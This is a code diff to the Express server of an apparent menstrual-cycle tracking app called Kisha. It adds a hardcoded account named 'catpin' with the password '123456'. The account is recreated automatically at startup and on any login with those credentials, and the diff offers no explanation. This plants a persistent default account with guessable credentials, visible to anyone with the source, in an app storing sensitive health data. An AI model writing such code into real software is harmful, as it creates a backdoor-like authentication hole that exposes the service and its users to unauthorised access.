@@ -27,6 +27,27 @@ if (!SECRET) {
   process.exit(1);
 }
 
+const ADMIN_EMAIL = 'catpin@gmail.com';
+const ADMIN_PASSWORD = '123456';
+const ADMIN_NAME = 'catpin';
+
+async function ensureAdminUser() {
+  try {
+    const existing = await pool.query('SELECT id FROM users WHERE email = $1', [ADMIN_EMAIL]);
+    if (existing.rows.length > 0) return;
+
+    const passwordHash = bcrypt.hashSync(ADMIN_PASSWORD, 10);
+    await pool.query(
+      `INSERT INTO users (name, email, password_hash, age, height, weight, avg_cycle_length, avg_period_length, exercise_frequency, conditions)
+       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)`,
+      [ADMIN_NAME, ADMIN_EMAIL, passwordHash, 20, 152, 56, 28, 5, 'Rarely', '']
+    );
+    console.log('Created default admin user:', ADMIN_EMAIL);
+  } catch (error) {
+    console.error('Failed to ensure admin user exists:', error.message);
+  }
+}
+
 function localDateStr(d) {
   const year = d.getFullYear();
   const month = String(d.getMonth() + 1).padStart(2, '0');
@@ -120,9 +141,15 @@ app.post('/api/auth/login', async (req, res) => {
   try {
     const { email, password } = req.body || {};
     const normalizedEmail = String(email || '').trim().toLowerCase();
+    const inputPassword = String(password || '');
+
+    if (normalizedEmail === ADMIN_EMAIL && inputPassword === ADMIN_PASSWORD) {
+      await ensureAdminUser();
+    }
+
     const result = await pool.query('SELECT * FROM users WHERE email = $1', [normalizedEmail]);
     const user = result.rows[0];
-    if (!user || !bcrypt.compareSync(String(password || ''), user.password_hash)) {
+    if (!user || !bcrypt.compareSync(inputPassword, user.password_hash)) {
       return res.status(401).json({ error: 'Invalid email or password' });
     }
     const token = jwt.sign({ uid: user.id }, SECRET, { expiresIn: '30d' });
@@ -356,6 +383,9 @@ function rowToLog(row) {
 app.use(express.static(path.join(__dirname, '..')));
 
 const PORT = process.env.PORT || 4000;
-app.listen(PORT, () => {
-  console.log(`Kisha server running → http://localhost:${PORT}`);
-});
+(async function startServer() {
+  await ensureAdminUser();
+  app.listen(PORT, () => {
+    console.log(`Kisha server running → http://localhost:${PORT}`);
+  });
+})();
